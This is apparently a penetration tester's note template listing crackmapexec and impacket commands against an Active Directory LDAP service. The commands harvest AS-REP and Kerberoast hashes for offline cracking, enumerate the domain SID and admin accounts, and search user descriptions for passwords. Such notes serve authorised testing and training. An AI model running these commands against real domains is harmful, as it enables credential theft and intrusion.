### ldap

```sh
# check AS-REP roastable users
# add '-k' to use kerberos authentication
crackmapexec ldap <% tp.frontmatter.fqdn %> -u '' -p '' --asreproast asreproast.hash
# or
impacket-GetNPUsers -request -outputfile asreproast.hash -dc-ip <% tp.frontmatter.hostname %> 'DOMAIN/USERNAME:PASSWORD'

# check Kerberoastable users
crackmapexec ldap <% tp.frontmatter.fqdn %> -u '' -p '' --kerberoasting kerberoast.hash
# or
impacket-GetUserSPNs -request -outputfile kerberoast.hash -dc-ip <% tp.frontmatter.hostname %> 'DOMAIN/USERNAME:PASSWORD'

# get domain SID
crackmapexec ldap <% tp.frontmatter.fqdn %> -u '' -p '' --get-sid

# list users with admin rights
crackmapexec ldap <% tp.frontmatter.fqdn %> -u '' -p '' --admin-count

# look for user passwords within descriptions
crackmapexec ldap <% tp.frontmatter.fqdn %> -u '' -p '' -M get-desc-users
```